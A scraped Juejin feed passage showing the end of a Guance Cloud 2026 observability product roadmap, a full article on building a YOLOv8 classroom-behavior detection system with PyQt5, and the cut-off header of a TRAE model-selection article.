<h3 data-id="heading-31">6.3 场景三：高并发写入 —— IoT 与车联网数据海啸</h3>
<ul>
<li>
<p>用户：车企（V2X）、智能制造、IoT 架构师。</p>
</li>
<li>
<p>痛点：写多读少。Tag（标签）基数极高（High Cardinality）。例如，百万辆车，每辆车有唯一的 VehicleID，传统时序数据库的倒排索引会因此膨胀爆炸，导致内存溢出。</p>
</li>
<li>
<p>观测云 2026 解决方案：稀疏索引与列式存储优化。</p>
<ul>
<li>原理：放弃对高基数 Tag 建立全量倒排索引。GuanceDB 借鉴先进的架构设计，采用 稀疏索引（Sparse Indexing）和数据分区（Micro-partitions） 技术。</li>
<li>效果：将 VehicleID 作为排序列，通过 Min/Max 索引快速跳过无关数据块。在不牺牲写入性能的前提下，支持对高基数标签的高效过滤，彻底解决“索引爆炸”问题。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7613e266e1f74bf797374ca6ce910691~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=EL1lihrvgHtk4nJsXlpvX%2Fc6lNk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-32">6.4 场景四：AI/LLM 可观测 —— Agent 行为治理</h3>
<ul>
<li>
<p>用户：AI 平台工程师、大模型应用开发者。</p>
</li>
<li>
<p>痛点：Agent 行为具有不确定性（幻觉、死循环），且 Token 成本昂贵。传统的 CPU/内存监控无法反映 AI 业务的健康度。</p>
</li>
<li>
<p>观测云 2026 解决方案：Model Telemetry 与成本归因。</p>
<ul>
<li>数据模型：引入专用的数据类型追踪 Prompt 和 Completion 的 Token 消耗、延迟、模型版本。</li>
<li>蓝图集成：通过蓝图实时监控 Token 消耗速率。一旦发现某个 Agent 陷入死循环（Token 消耗斜率异常），立即触发熔断机制（Action 节点），并通知开发者。</li>
<li>价值：进阶到 AI 业务治理，为企业节省真金白银的算力成本。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17f0fca5505745998d52d3a13d56b8a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=9%2F5QWSevhWOlgaPV9yw27dlf0C0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-33">6.5 场景五：日志成本黑洞 —— 拒绝存不起，查不到</h3>
<ul>
<li>
<p>用户： 运维总监、合规审计部门、FinOps 负责人。</p>
</li>
<li>
<p>痛点： 日志数据量呈指数级增长（每天几十 TB），但 99% 的日志通常都用不上，只有故障时才需要回溯。传统方案要么全量索引导致存储成本天价，要么为了省钱只存 3 天导致关键数据丢失。</p>
</li>
<li>
<p>观测云 2026 解决方案： 冷热分层（Tiered Storage）+ Schema-on-Read（读时建模）。</p>
<ul>
<li>原理： GuanceDB 引入智能分层策略。热数据（最近 3 天）存高性能 SSD 并建立全索引；温/冷数据（3 天 - 3 年）自动下沉至对象存储（S3/OSS），不建立繁重倒排索引。当需要查询冷数据时，利用算子下推（Pushdown）临时扫描目标块。</li>
<li>效果： 将日志的长期存储成本降低 80% 以上。让企业存得起海量日志，还能在需要审计时，无需数据迁移即可直接查询历史归档。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac60473e45b04760a8a796a583a2dcd0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=JapLndcj1vRhvRl6R4uIUgiH0BY%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-34">6.6 场景六：微服务风暴 —— 抓住百万分之一的异常</h3>
<ul>
<li>
<p>用户： 架构师、中台研发负责人。</p>
</li>
<li>
<p>痛点： 在成百上千个微服务的调用链中，每天产生数亿条 Trace 数据。传统 APM 采用头部采样（Head-based Sampling）（如只采 1%），容易导致“关键的报错请求正好被丢弃了”，无法还原故障现场。</p>
</li>
<li>
<p>观测云 2026 解决方案： 100% 全量摄取 + 尾部采样（Tail-based Sampling）。</p>
<ul>
<li>原理： 数据进入系统时不做丢弃，先在内存缓冲区暂存。通过流式引擎实时分析整条链路的尾部状态（是否报错、是否高延迟）。只有有问题或高价值的链路才会被持久化存储，正常的无用链路自动丢弃。</li>
<li>价值： 在不增加存储预算的前提下，实现100% 的异常捕获率。不再靠运气抓 Bug，而是靠精准的算法。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31ed2ef77d614f698cc60666b747ed11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=9GQtpzCwD5j3bbnIT5%2F1szvKOLI%3D" alt="" loading="lazy"/></p>
<p>当然以上仅是冰山一角。观测云的统一数据底座已打破场景壁垒，无论是日志降本还是链路追踪，皆能以一套架构，从容应对万千需求。</p>
<h2 data-id="heading-35">结语：观测云的2026</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3daf0f7002dd408db9db334edbef3d1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768296206&amp;x-signature=bUFwxcLRKdUrw9%2FRA5MsDt5chmg%3D" alt="" loading="lazy"/></p>
<p>观测云 2026 的产品预告是对未来观测形态的一次预判与押注。</p>
<ul>
<li>市场在变：AI Agent 带来了复杂性，FinOps 带来了成本压力，数据主权带来了架构约束。</li>
<li>产品在变：蓝图将会成为企业的自动化中枢；GuanceDB 拥抱 S3，打破存储的物理边界，用云原生的架构解决云时代的规模问题。</li>
<li>价值在变：我们针对不同角色（CIO、SRE、IoT 架构师、AI 工程师等等）提供不同场景都可用的灵活解决方案。</li>
</ul>
<p>对于 CTO 和 CIO 而言，选择观测云 2026，不仅是选择了一个监控平台，更是选择了一套能够驾驭 AI 时代不确定性、从容应对数据洪流的系统。请查收这份产品路线图。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于 YOLOv8 的学生课堂行为检测(举手、看书、写作业、玩手机)-完整项目源码]]></title>    <link>https://juejin.cn/post/7591767753851748394</link>    <guid>https://juejin.cn/post/7591767753851748394</guid>    <pubDate>2026-01-06T09:42:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591767753851748394" data-draft-id="7592088192515686443" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于 YOLOv8 的学生课堂行为检测(举手、看书、写作业、玩手机)-完整项目源码"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T09:42:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我是杰尼"/> <meta itemprop="url" content="https://juejin.cn/user/4200579899599495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于 YOLOv8 的学生课堂行为检测(举手、看书、写作业、玩手机)-完整项目源码
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4200579899599495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我是杰尼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:42:26.000Z" title="Tue Jan 06 2026 09:42:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">基于 YOLOv8 的学生课堂行为检测-完整项目源码</h2>
<h3 data-id="heading-1">一、问题背景：为什么要做“课堂行为识别”</h3>
<p>在智慧校园和数字化教学逐步落地的过程中，<strong>课堂行为数据</strong>正在从“不可量化”走向“可分析、可追溯、可评估”。</p>
<p>在真实教学场景中，教师和管理者往往关注以下问题：</p>
<ul>
<li>学生是否专注听讲？</li>
<li>是否存在频繁低头、趴桌、玩手机等行为？</li>
<li>课堂互动（举手、回答问题）是否足够积极？</li>
<li>不同时间段、不同课程的学习状态差异如何？</li>
</ul>
<p>传统方式主要依赖<strong>人工巡视或事后主观评价</strong>，存在明显局限：</p>





















<table><thead><tr><th>方式</th><th>问题</th></tr></thead><tbody><tr><td>人工观察</td><td>成本高、主观性强、难以量化</td></tr><tr><td>问卷反馈</td><td>滞后、失真、难以持续</td></tr><tr><td>简单视频回放</td><td>无结构化信息、分析效率低</td></tr></tbody></table>
<p>因此，<strong>基于计算机视觉的课堂行为识别系统</strong>成为一个极具实际价值的工程方向。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d20ddfa5d984a85826f505a80422258~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=Aa%2FgedVVHhoU5dGj2wPWfmFfPGw%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-2">源码下载与效果演示</h3>
<p>哔哩哔哩视频下方观看：
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1m7KJzNEQ2%2F" target="_blank" title="https://www.bilibili.com/video/BV1m7KJzNEQ2/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1m7…</a></p>
<p>包含：</p>
<p>📦完整项目源码</p>
<p>📦 预训练模型权重</p>
<p>🗂️ 数据集地址（含标注脚本
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d844cc0f7f244688f0a7fde8ea91a67~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=56jr8DiRVFGmPF93%2BhWpDIWqEhk%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-3">二、整体技术路线设计</h3>
<p>本项目的目标不是“只跑一个模型 Demo”，而是构建一个<strong>可直接使用的完整系统</strong>。因此在设计之初，整体架构就围绕以下三点展开：</p>
<ol>
<li><strong>模型必须实时可用</strong></li>
<li><strong>系统必须非算法人员也能操作</strong></li>
<li><strong>工程结构支持后续扩展</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4784907f57e7495991c06f73e08769fb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=3wC3XmlBpz8cw5nnx2zwoi42%2Fkc%3D" alt="在这里插入图片描述" loading="lazy"/></li>
</ol>
<h4 data-id="heading-4">2.1 系统总体架构</h4>
<p>整体采用典型的三层结构：</p>
<pre><code class="hljs">数据层 → 模型层 → 应用层
</code></pre>
<ul>
<li><strong>数据层</strong>：YOLO 格式行为数据集（图片 + 标签）</li>
<li><strong>模型层</strong>：YOLOv8 Detection 模型（PyTorch）</li>
<li><strong>应用层</strong>：PyQt5 桌面 GUI + 多输入推理模块</li>
</ul>

<pre><code class="hljs language-markdown" lang="markdown">摄像头 / 视频 / 图片
<span class="hljs-code">        ↓
   YOLOv8 行为检测
        ↓
   行为类别 + 置信度
        ↓
   GUI 实时展示 / 保存结果
</span></code></pre>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f43535a7075c49f9aca318f8b4debda8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=cNN%2F8ApwXGgXBPZA6%2FhI8C0Jj9k%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66ec313a265c4d44917540a9567d045e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=f8lwhjOa1RH9nnlnI3BtX9IlqjM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-5">三、为什么选择 YOLOv8 做课堂行为识别</h3>
<p>在行为识别领域，常见技术路线包括：</p>
<ul>
<li><strong>CNN + 分类</strong>（仅判断整张图）</li>
<li><strong>CNN + 时序模型（LSTM / Transformer）</strong></li>
<li><strong>目标检测 + 行为标签</strong></li>
</ul>
<p>在课堂场景中，我们更关心的是：</p>
<blockquote>
<p><strong>“谁”在“做什么行为”</strong></p>
</blockquote>
<p>因此，<strong>目标检测模型</strong>比单纯分类模型更合适。</p>
<h4 data-id="heading-6">3.1 YOLOv8 的工程优势</h4>
<p>YOLOv8 相比早期 YOLO 版本，具备明显工程优势：</p>
<ul>
<li><strong>Anchor-Free 设计</strong>
不再依赖复杂 Anchor 调参，对新场景友好</li>
<li><strong>端到端训练流程简化</strong></li>
<li><strong>推理速度快，适合实时摄像头</strong></li>
<li><strong>Ultralytics 官方生态成熟</strong></li>
<li><strong>原生支持 ONNX / TensorRT 导出</strong></li>
</ul>
<p>对于“课堂实时监测”这种 <strong>FPS 和稳定性同等重要</strong> 的任务，YOLOv8 是非常理性的选择。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5df41cbcfc50413a9530b456e8e2994b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=H0xjdj9BzIt7CP%2FO3cXVYFeNLkU%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-7">四、行为数据集构建：比模型更重要的一步</h3>
<p>在实际项目中，<strong>数据质量往往决定上限</strong>。</p>
<h4 data-id="heading-8">4.1 行为类别设计原则</h4>
<p>本项目中的课堂行为类别遵循三个原则：</p>
<ol>
<li><strong>视觉上可区分</strong></li>
<li><strong>教学场景有明确意义</strong></li>
<li><strong>避免过细导致标注困难</strong></li>
</ol>
<p>示例类别包括：</p>
<ul>
<li>举手</li>
<li>看书</li>
<li>写作业</li>
<li>听讲</li>
<li>趴桌</li>
<li>玩手机</li>
</ul>
<p>这些行为都可以通过<strong>单帧图像 + 空间特征</strong>进行判别，而无需复杂时序建模。</p>
<hr/>
<h4 data-id="heading-9">4.2 数据集结构（YOLO 标准）</h4>
<pre><code class="hljs language-text" lang="text">dataset/
├── images/
│   ├── train/
│   └── val/
├── labels/
│   ├── train/
│   └── val/
</code></pre>
<p>标签采用 YOLO 标准格式：</p>
<pre><code class="hljs language-arduino" lang="arduino">class_id x_center y_center width height
</code></pre>
<p>例如：</p>
<pre><code class="hljs language-txt" lang="txt">3 0.51 0.36 0.39 0.32
</code></pre>
<blockquote>
<p>所有坐标均为 <strong>相对比例</strong>，方便多分辨率训练。</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">五、模型训练与参数配置经验</h3>
<h4 data-id="heading-11">5.1 训练策略</h4>
<p>在课堂场景中，模型训练重点并不是追求极限精度，而是：</p>
<ul>
<li><strong>稳定收敛</strong></li>
<li><strong>类别区分度清晰</strong></li>
<li><strong>推理速度可控</strong></li>
</ul>
<p>示例训练命令：</p>
<pre><code class="hljs language-bash" lang="bash">yolo detect train \
  data=dataset/classroom.yaml \
  model=yolov8n.pt \
  epochs=100 \
  batch=16 \
  imgsz=640
</code></pre>
<h4 data-id="heading-12">5.2 关键指标解读</h4>
<p>训练完成后，重点关注：</p>
<ul>
<li><strong>mAP@0.5</strong>：是否稳定在 90% 左右</li>
<li><strong>混淆矩阵</strong>：是否存在行为间严重混淆</li>
<li><strong>box_loss / cls_loss 收敛情况</strong></li>
</ul>
<p>课堂行为中，“看书 / 写作业”是最容易混淆的类别，通常需要通过 <strong>数据平衡和样本增强</strong> 来改善。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bf75a3e27dd41d0937e3dbfef3d95f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=VC6C%2F8qIO%2BsCBnG1F5rGd0h7th8%3D" alt="在这里插入图片描述" loading="lazy"/>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7a29fcb542546bdb2201ac66fa78f62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=QbIzuYAhZn7F8gVQkp0tBQySWCM%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h3 data-id="heading-13">六、推理系统设计：从模型到可用软件</h3>
<p>如果说模型是“发动机”，那么 <strong>GUI 系统</strong>就是“驾驶舱”。</p>
<h4 data-id="heading-14">6.1 多输入推理设计</h4>
<p>系统支持以下输入形式：</p>
<ul>
<li>单张图片检测</li>
<li>文件夹批量检测</li>
<li>视频文件检测</li>
<li>摄像头实时检测</li>
</ul>
<p>其核心思想是：</p>
<blockquote>
<p><strong>统一推理接口，不同输入仅影响数据读取方式</strong></p>
</blockquote>
<pre><code class="hljs language-python" lang="python">results = model(frame, conf=<span class="hljs-number">0.25</span>)
</code></pre>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a014c1ca27aa4835b8ae2ca8b4ecd93a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oiR5piv5p2w5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297346&amp;x-signature=ooCB5uxAeAgUbdsHhL21lzwQCSA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<h4 data-id="heading-15">6.2 PyQt5 界面设计要点</h4>
<p>GUI 设计遵循三个工程原则：</p>
<ol>
<li><strong>功能按钮逻辑清晰</strong></li>
<li><strong>推理与界面解耦</strong></li>
<li><strong>避免阻塞主线程</strong></li>
</ol>
<p>常见功能包括：</p>
<ul>
<li>模型加载</li>
<li>输入源选择</li>
<li>实时结果显示</li>
<li>结果保存开关</li>
</ul>
<p>这种设计使得<strong>非算法人员也能直接运行系统</strong>。</p>
<hr/>
<h3 data-id="heading-16">七、实际应用价值分析</h3>
<p>在真实教学场景中，该系统可用于：</p>
<ul>
<li><strong>课堂状态统计分析</strong></li>
<li><strong>教学质量评估辅助</strong></li>
<li><strong>学生行为数据可视化</strong></li>
<li><strong>智慧教室系统模块化集成</strong></li>
</ul>
<p>相比“单纯监控”，该系统更强调：</p>
<blockquote>
<p><strong>结构化行为数据的自动生成</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-17">八、可扩展方向与进阶思路</h3>
<p>该项目并非终点，而是一个可持续扩展的工程起点。</p>
<p>可扩展方向包括：</p>
<ul>
<li><strong>引入姿态估计（Keypoints）</strong></li>
<li><strong>多摄像头联动分析</strong></li>
<li><strong>行为时间序列建模</strong></li>
<li><strong>行为频次 / 趋势统计</strong></li>
<li><strong>与教学管理系统对接</strong></li>
</ul>
<p>未来可从“检测行为”升级为：</p>
<blockquote>
<p><strong>理解课堂状态</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-18">九、总结</h3>
<p>本文从工程视角出发，完整复盘了一个 <strong>基于 YOLOv8 的学生课堂行为识别系统</strong> 从需求分析、模型选择、数据构建、训练评估到 GUI 应用落地的全过程。</p>
<p>该项目的核心价值不在于“某一个模型指标”，而在于：</p>
<ul>
<li>模型可实时运行</li>
<li>系统可直接部署</li>
<li>工程结构可持续演进</li>
</ul>
<p>对于希望将 <strong>计算机视觉真正落地到教育场景</strong> 的开发者而言，这是一个非常具有实践意义的方向。</p>
<p>本文从工程实践角度系统性地梳理了一个基于 YOLOv8 的学生课堂行为识别系统的完整落地过程，涵盖需求背景、模型选型、数据集构建、训练评估以及 PyQt5 图形化应用封装等关键环节。实践表明，目标检测模型在课堂行为分析这一复杂场景中具备良好的实时性与可扩展性，能够有效将“不可量化的课堂状态”转化为结构化、可分析的数据资产。相比单一算法实验，本项目更强调模型与系统的协同设计，使 AI 能够真正服务于教学管理与教学分析。未来，随着姿态估计、多模态数据与行为统计分析的引入，该类系统有望从行为识别进一步升级为课堂状态理解与教学决策支持，为智慧校园建设提供更加可靠的技术基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE 国际版 SOLO 模式下的模型选择指南]]></title>    <link>https://juejin.cn/post/7592068193419542537</link>    <guid>https://juejin.cn/post/7592068193419542537</guid>    <pubDate>2026-01-06T09:45:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592068193419542537" data-draft-id="7591986565855248430" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE 国际版 SOLO 模式下的模型选择指南"/> <meta itemprop="keywords" content="Trae"/> <meta itemprop="datePublished" content="2026-01-06T09:45:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="TRAE_ai"/> <meta itemprop="url" content="https://juejin.cn/user/3048259110571032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE 国际版 SOLO 模式下的模型选择指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3048259110571032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    TRAE_ai
